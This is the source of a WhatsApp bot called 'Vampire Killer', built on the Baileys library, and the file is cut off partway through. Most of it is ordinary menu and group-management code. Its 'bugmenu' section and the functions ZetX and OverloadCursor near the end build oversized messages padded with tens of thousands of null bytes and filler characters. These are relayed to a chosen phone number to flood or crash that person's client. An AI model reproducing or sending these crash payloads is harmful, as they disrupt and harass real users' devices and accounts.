/*

dencrypt by https://t.me/YDqrsc

Error ? fix sendiri 

*/

require('./setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const path = require('path')
const cp = require('child_process');
const { promisify } = require('util');
const util = require("util");
const ms = require("parse-ms");
const sharp = require('sharp');
const crypto = require('crypto');
const yts = require('yt-search')
const moment = require("moment-timezone");
const scdl = require('soundcloud-downloader').default;
const { spawn, exec, execSync } = require('child_process');
const { color } = require('./start/lib/color');
const tdxlol = fs.readFileSync('./tdx.jpeg');

const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
    try {
        if (global.db.data == null) await loadDatabase();
        require('./start/lib/database/schema')(m);

const chats = global.db.data.chats[m.chat];
const users = global.db.data.users[m.sender];
const settings = global.db.data.settings;
      
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const budy = (typeof m.text === 'string' ? m.text : '');
        
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key);
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

//database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const _afk = JSON.parse(fs.readFileSync('./start/lib/database/afk.json'));
const pendaftar = JSON.parse(fs.readFileSync('./start/lib/database/pendaftar.json'));
const orang_spam = JSON.parse(fs.readFileSync('./start/lib/database/spaming.json'));
const user_ban = JSON.parse(fs.readFileSync('./start/lib/database/banned.json'))

const botNumber = await conn.decodeJid(conn.user.id);
const isUser = pendaftar.includes(m.sender)
const Access = [global.owner, ...kontributor, ...global.owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender) ? true : m.isChecking ? true :false

const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix);
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");

const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime);

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
//group
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

const isBan = user_ban.includes(m.sender)
//time
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};

const peler = fs.readFileSync('./start/lib/media/peler.jpg')
const cina = ["https://files.catbox.moe/v1ulp7.jpg"]
 
function getRandomImage() {
    const randomIndex = Math.floor(Math.random() * cina.length);
    return cina[randomIndex];
}
const cinahitam = getRandomImage()

async function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
        
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

//function
const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    generateMessageTag, 
    getBuffer,
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep,
    getRandom
} = require('./start/lib/myfunction');
    
const { 
    imageToWebp, 
    videoToWebp,
    writeExifImg,
    writeExifVid,
    addExif
} = require('./start/lib/exif')

const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./start/jadibot')

const { ytdl } = require('./start/lib/scrape/scrape-ytdl');   
const { spamngl } = require('./start/lib/scrape/scrape-ngl');
const { pindl } = require('./start/lib/scrape/scrape-pindl')
const { tiktok } = require('./start/lib/scrape/scrape-tiktok')
const { igdl } = require('./start/lib/scrape/scrape-igdl')
const { luminai } = require('./start/lib/scrape/scrape-luminai')
const { VocalRemover } = require('./start/lib/scrape/scrape-tovocal')
const { Telesticker } = require('./start/lib/scrape/scrape-telesticker')
const { pinterest } = require("./start/lib/scrape/scrape-pinterest");
const { scrapeSoundCloud } = require("./start/lib/scrape/scrape-soundcloud")
const msgFilter = require("./start/lib/antispam");
const uploadImage = require('./start/lib/uploadImage');
        
const afk = require("./start/lib/afk")
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
/* fungsinya, ketika user yang sudah menggunakan command afk, maka tidak bisa lagi menggunakan command tersebut sampai dia kembali dari afk nya */

const _prem = require("./start/lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);
//const gcounti = global.gcount
//const gcount = isPremium ? gcounti.prem : gcounti.user
let limitUser = isPremium ? 1500 : global.limitCount

const reaction = async (jidss, emoji) => {
    conn.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };

 async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
        
async function resetLimit() {
  for (let i of users) {
      db.data.users[i].limit = limitUser;
  }
}
        
      
if (m.isGroup) {
    if (body.includes(`@6283890875133`)) {
        reaction(m.chat, "❓")
    }
 }

        
if (m.message) {
    if (isCmd && !m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)))
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`
     )
   )
);
    } else if (m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`
       ))
     );
  }
}

        
if (isCmd && !isUser) {
    pendaftar.push(m.sender)
    fs.writeFileSync('./start/lib/database/pendaftar.json', JSON.stringify(pendaftar, null, 2))
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
 
msgFilter.ResetSpam(orang_spam);
        const spampm = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give pause for a few seconnds.");
        };

        const spamgr = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give 10 seconnds.");
    };

    if (isCmd && msgFilter.isFiltered(m.sender) && m.isGroup) return spampm();
    if (isCmd && msgFilter.isFiltered(m.sender) && !m.isGroup) return spamgr();
  //if (isCmd && args.length < 1 && !Access) msgFilter.addFilter(m.sender);
      
if (m.mtype.includes("imageMessage") && m.isGroup) {
    try {
        const isBotAdmin = groupMetadata.participants.some(participant => 
          participant.id === botNumber && participant.admin
        );
        
        const q = m.quoted ? m.quoted : m;
        
if (!q || !q.message.imageMessage) {
    console.error('Pesan tidak memiliki imageMessage');
    return;
}

        const media = await q.download();
        const mime = q.message.imageMessage.mimetype;
        const isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
        const uploadFile = require('./start/lib/uploadFile');     
        const link = await (isTele ? uploadImage : uploadFile)(media);
  
 if (!link) {
     console.error('Gagal mengunggah media');
     return;
 }

        const response = await fetch(`https://api.tioprm.eu.org/nsfwdetector?url=${link}`);
        const telaso = await response.json();
        const labelName = telaso.result.labelName;
        const labelId = telaso.result.labelId;

if (labelName.toLowerCase() === 'porn') {
        const warningMessage = `*PORN DETECTED*

> Status: ${labelName}
> Label ID: ${labelId}

action: delete the image`;
    await conn.sendMessage(m.chat, { text: warningMessage }, { quoted: m });
    await conn.deleteMessage(m.chat, m.key);
    }
  } catch (error) {
    console.error('Error memproses deteksi gambar:', error);
  }
}
        
      
async function reply(teks) {
    conn.sendMessage(m.chat, {
        text: teks,
        mentions: conn.ments(teks),
        isForwarded: true
    }, {quoted: m})
}

async function sendMusic(teks) {
    let img = { url : cinahitam, 
               type : "image/jpeg"
              }
          
    let url = `https://whatsapp.com/channel/0029VajP9eX4SpkP50HLW03m`    
    let contextInfo = {
        externalAdReply: {    
            showAdAttribution: true,    
            title: `ずうVampire`,      
            body: `tell me why i'm waiting?`,     
            description: 'Now Playing ....',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    conn.sendMessage(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }
     
 if (!m.key.fromMe && global.autoread) {
     const readkey = {
         remoteJid: m.chat,
         id: m.key.id,
         participant: m.isGroup ? m.key.participant : undefined
     }
     await conn.readMessages([readkey]);
 }
        conn.sendPresenceUpdate('available', m.chat)
      
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

        
async function makeStickerFromUrl(imageUrl, conn, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await conn.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `ずう Vampire`,
                    body: `tell me why i'm waiting?`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: cinahitam, 
                    sourceUrl: `https://Zyurzyen.tech`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}
      
 if (m.isGroup && !m.key.fromMe) {
  let mentionUser = [
    ...new Set([
      ...(m.mentionedJid || []),
      ...(m.quoted ? [m.quoted.sender] : []),
    ]),
  ];

 for (let ment of mentionUser) {
    if (afk.checkAfkUser(ment, _afk)) {
      let getId2 = afk.getAfkId(ment, _afk);
      let getReason2 = afk.getAfkReason(getId2, _afk);
      let getTimee = Date.now() - afk.getAfkTime(getId2, _afk);
      let heheh2 = ms(getTimee);
      reply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`);
    }
  }

 if (afk.checkAfkUser(m.sender, _afk)) {
    let getId = afk.getAfkId(m.sender, _afk);
    let getReason = afk.getAfkReason(getId, _afk);
    let getTime = Date.now() - afk.getAfkTime(getId, _afk);
    let heheh = ms(getTime);

    _afk.splice(afk.getAfkPosition(m.sender, _afk), 1);
    fs.writeFileSync("./start/lib/database/afk.json", JSON.stringify(_afk));
      reply(`@${m.sender.split("@")[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`);
  }
 }
  
 if (chats.antilink) {
     if (budy.includes('chat.whatsapp.com')) {
         if (isAdmins || Access) return;
         reply(`> GROUP LINK DETECTOR\n\nsepertinya kamu mengirimkan link grup, maaf, pesan tersebut saya hapus`);
         if (!isBotAdmins) return reply(`bot bukan admin`);
         let gclink = `https://chat.whatsapp.com/${await conn.groupInviteCode(m.chat)}`;
         if (budy.includes(gclink)) return;
         await conn.sendMessage(m.chat, {
             delete: m.key
         });	
     }  
 }

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

conn.autoshalat = conn.autoshalat ? conn.autoshalat : {};
        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.id : m.sender;
        let id = m.chat;
        if (id in conn.autoshalat) {
            return false;
        }
        let jadwalSholat = {
            shubuh: "04:27",
            terbit: "05:52",
            dzuhur: "12:05",
            ashar: "15:32",
            magrib: "18:17",
            isya: "19:33",
        };

        const datek = new Date(
            new Date().toLocaleString("en-US", {
                timeZone: "Asia/Makassar",
            }),
        );
        const hours = datek.getHours();
        const minutes = datek.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                let caption = `hai bro ${pushname}
This is Vampire killer*${sholat}* by Giddy Tennor, enjoy,

*${waktu}*
_yiu can never be me._`;
                conn.autoshalat[id] = [
                    conn.sendMessage(m.chat, { 
                        text: caption,
                        footer: "© Tennormodz - 2025",
                        buttons: [
                            {
                                buttonId: ".bike", 
                                buttonText: { 
                                    displayText: 'baik' 
                                }, type: 1 }
                        ],
                        viewOnce: true,
                        headerType: 1
                    }, { quoted: m }),
                    setTimeout(async () => {
                        delete conn.autoshalat[m.chat];
                    }, 57000),
                ];
            }
        }

        
switch (command) {
    case 'bike':{
        await reaction(m.chat, '❤️')
    }
    break
        
    case 'bcxcff':
    case 'jack':{
        let anj = `*Vampire killer plus* is a WhatsApp bot developed using NodeJS and Baileys library. This bot was created to provide a better user experience in interacting on the platform`;
        conn.sendMessage(m.chat, { 
            text: anj,
            footer: "© Tennormodz- 2025",
            buttons: [
                {
                    buttonId: ".allmenu", 
                    buttonText: { 
                        displayText: 'AllMenu' 
                    }, type: 1 }, 
                { 
                    buttonId: ".bugmenu", 
                    buttonText: {
                        displayText: "BugMenu"
                    }, type: 1 },
                { 
                    buttonId: ".tqto", 
                    buttonText: {
                        displayText: "Tqto"
                    }, type: 1 },
                 {
                    buttonId: ".author", 
                    buttonText: {
                        displayText: "Author"
                    }, type: 1 }
            ],
            viewOnce: true,
            headerType: 1
        }, { quoted: m });
    }
    break;
        
case 'allmenu': {
if (isBan) return
    let limitnya = users.totalLimit
    let anj = `I am an automated system (WhatsApp Bot) that can help to do something, search and get data / information only through WhatsApp.

— sticker
 ✦ ${prefix}brat
 ✦ ${prefix}sticker
 ✦ ${prefix}telestick
 ✦ ${prefix}stext
 ✦ ${prefix}qc

— owner
 ✦ ${prefix}public
 ✦ ${prefix}self
 ✦ ${prefix}addowner 
 ✦ ${prefix}dellowner
 ✦ ${prefix}addprem 
 ✦ ${prefix}delprem
 ✦ ${prefix}upch
 ✦ ${prefix}banchat
 ✦ ${prefix}unbanchat
 ✦ ${prefix}banuser
 ✦ ${prefix}unbanuser
 ✦ ${prefix}listbanned
 ✦ ${prefix}delplug
 ✦ ${prefix}listplug
 ✦ ${prefix}getplug
 ✦ ${prefix}getq
 ✦ ${prefix}setpp

— group
 ✦ ${prefix}tagall
 ✦ ${prefix}totag
 ✦ ${prefix}tagme
 ✦ ${prefix}quote
 ✦ ${prefix}d
 ✦ ${prefix}promote
 ✦ ${prefix}demote
 ✦ ${prefix}hidetag
 ✦ ${prefix}kick

— settings group
 ✦ ${prefix}antilink on/off

— tools
 ✦ ${prefix}spam-ngl
 ✦ ${prefix}tovn
 ✦ ${prefix}get
 ✦ ${prefix}pinterest
 ✦ ${prefix}tourl
 ✦ ${prefix}toimg

— ai
 ✦ ${prefix}vocal
 ✦ ${prefix}remini
 ✦ ${prefix}openai
 ✦ ${prefix}ai
 ✦ ${prefix}gemini
 ✦ ${prefix}chatgpt

— audio
 ✦ ${prefix}bass
 ✦ ${prefix}blown
 ✦ ${prefix}deep
 ✦ ${prefix}earrape
 ✦ ${prefix}fast
 ✦ ${prefix}fat
 ✦ ${prefix}nightcore
 ✦ ${prefix}reverse
 ✦ ${prefix}robot
 ✦ ${prefix}slow
 ✦ ${prefix}smooth
 ✦ ${prefix}tupai

— fun
 ✦ ${prefix}cekkhodam
 ✦ ${prefix}apakah
 ✦ ${prefix}bisakah
 ✦ ${prefix}bagaimanakah

— main
 ✦ ${prefix}afk
 ✦ ${prefix}jodoh
 ✦ ${prefix}jadian
 ✦ ${prefix}cekpacar
 ✦ ${prefix}werewolf/ww

— jadibot
 ✦ ${prefix}jadibot
 ✦ ${prefix}listjadibot
 ✦ ${prefix}stopjadibot

— information
 ✦ ${prefix}ping
 ✦ ${prefix}speedtest
 ✦ ${prefix}disk
 ✦ ${prefix}tqto

— download
 ✦ ${prefix}play
 ✦ ${prefix}fbdl
 ✦ ${prefix}pindl
 ✦ ${prefix}igdl
 ✦ ${prefix}tiktok
`;
const buttons = [
  {
    buttonId: `${prefix}owner`, 
    buttonText: { 
      displayText: 'owner' 
    }
  }, {
    buttonId: ".ping", 
    buttonText: {
      displayText: "Ping"
    }
  }
]

const buttonMessage = {
    document: { url: "https://wa.me/254756182478" },
    mimetype: "application/pdf",
    fileName: "Tennor- Assistant",
    fileLength: 999999999999999,
    pageCount: 12345678,
    jpegThumbnail: fs.readFileSync('./start/lib/media/tes.png'),
    caption: anj,
    footer: '© Tennormodz - 2025',
    mentions: await conn.ments('Aʟʟ Mᴇɴᴜ'),
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: "tell me why i'm waiting?", 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://vampire.tech", 
        thumbnail: fs.readFileSync('./start/lib/media/tes.png'), 
        thumbnailUrl: cinahitam, 
        title: 'Vampire Killer',
      },
    },
    viewOnce: true,
    headerType: 6
  };

return await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
  };
  break;
   case 'menu': {

let caption = `*Hey This is Vampire kiler V15 do you know why am here?*.

*Bot info*
⁂ Bőt Ńáḿé:Vampire killer 
⁂ Véŕśíőń:15
⁂ Dévéĺőṕéŕ:Giddy Tennor
⁂ Tӳṕé:Plugins+Case

*am here to help you with all you want* 
*enjoy.*

> Thanks to:
Giddy Tennor: *Dev/Creator*
Zuu: *Base bot*
Lonely Saam: *Best friend/Partner*

> buy sc?:https://wa.me/254756182478
`;
const buttons = [
{
buttonId: `${prefix}owner`, 
buttonText: { 
displayText: 'owner' 
}
}, {
buttonId: "tqto", 
buttonText: {
displayText: `${prefix}tqto`
}
}
]
const buttonMessage = {
document: { url: "https://wa.me/254104245659" },
mimetype: "image/jpg",
fileName: "ҡเℓℓεɾ cɾαรɦ",
fileLength: 7777777777777,
pageCount: 77777,
jpegThumbnail: {
url: "Url : https://files.catbox.moe/d8kmr4.jpg"
}, 
caption: caption,
footer: '© Tennormodz - 2025',
buttons: buttons,
headerType: 2,
contextInfo: { 
forwardingScore: 99999, 
externalAdReply: { 
body: `hi ${pushname}`, 
containsAutoReply: true, 
mediaType: 1, 
mediaUrl: "peler",
renderLargerThumbnail: true, 
showAdAttribution: true, 
sourceId: 'Tes', 
sourceType: 'PDF', 
previewType: 'PDF', 
sourceUrl: "", 
thumbnail: {
url: "Url : Url : https://files.catbox.moe/d8kmr4.jpg"
}, 
thumbnailUrl: "Url : Url : https://files.catbox.moe/d8kmr4.jpg", 
title: 'ᏙᎪᎷᏢᏆᎡᎬ ᏦᏆᏞᏞᎬᎡ Ꮩ15',
},
},
viewOnce: true,
headerType: 6
};

const flowActions = [
{
buttonId: 'action',
buttonText: { displayText: 'Aksi dengan flow' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "𝐂𝐡𝐨𝐨𝐬𝐞-𝐌𝐞𝐧𝐮",
sections: [
{
title: "ᏔᎻᎽ ᎪᎡᎬ ᎽϴႮ ᏔᎪᏆͲᏆΝᏀ",
highlight_label: "𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐓𝐞𝐧𝐧𝐨𝐫𝐦𝐨𝐝𝐳",
rows: [
{
header: "ᏟᎡᎪՏᎻ ᎷᎬΝႮ",
title: "ᏴႮᏀ",
description: "Displays crash/ bug commands",
id: `${prefix}bugmenu`
},
   
  
{
header: "ᎷᎬΝႮ ᎪᏞᏞ",
title: "ᎪᏞᏞ",
description: "displays all commands",
id: `${prefix}allmenu`
}
]
}
]
})
},
viewOnce: true
}
];
buttonMessage.buttons.push(...flowActions);
return await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
};
  
break;   


    
    
case 'bugmenu': {
if (isBan) return
    let limitnya = users.totalLimit
    let anj = `I am an automated system (WhatsApp Bot) I will help you with the bug for make bad people afraid

— Bugmenu-pc (selective)
 ✦ ${prefix}attack

— Bugmenu-gc
 ✦ ${prefix}crash-gc
 ✦ ${prefix}kill-gc
 

`;
const buttons = [
  {
    buttonId: `${prefix}owner`, 
    buttonText: { 
      displayText: 'owner' 
    }
  }, {
    buttonId: ".ping", 
    buttonText: {
      displayText: "Ping"
    }
  }
]

const buttonMessage = {
    document: { url: "https://wa.me/254756182478" },
    mimetype: "application/pdf",
    fileName: "Tennor - Assistant",
    fileLength: 999999999999999,
    pageCount: 12345678,
    jpegThumbnail: fs.readFileSync('./start/lib/media/tes.png'),
    caption: anj,
    footer: '© Tennormodz - 2025',
    mentions: await conn.ments('Aʟʟ Mᴇɴᴜ'),
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: "tell me why i'm waiting?", 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://vampire.tech", 
        thumbnail: fs.readFileSync('./start/lib/media/tes.png'), 
        thumbnailUrl: cinahitam, 
        title: 'ᏦᏆᏞᏞᎬᎡ',
      },
    },
    viewOnce: true,
    headerType: 6
  };

return await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
  };
  break;
        async function ZetX(bijipler) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [bijipler],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: bijipler,
            },
          },
          body: {
            text: "Masive Flood",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "𝐕𝐀𝐦𝐩𝐢𝐫𝐞",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "𝐕𝐀𝐦𝐩𝐢𝐫𝐞",
              },
              {
                name: "mpm",
                buttonParamsJson: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
              },
            ],
          },
        },
      },
    },
  };
  

  await conn.relayMessage(bijipler, message, {
    participant: { jid: bijipler },
  });
}
async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "Vampire is here" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "😹",
          },
          contextInfo: {
            virtexId: conn.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Z?" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: tdxlol,
                },
                hasMediaAttachment: true,
                contentText: 'Shith"👋"',
                footerText: "|| kontol? ꦽ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
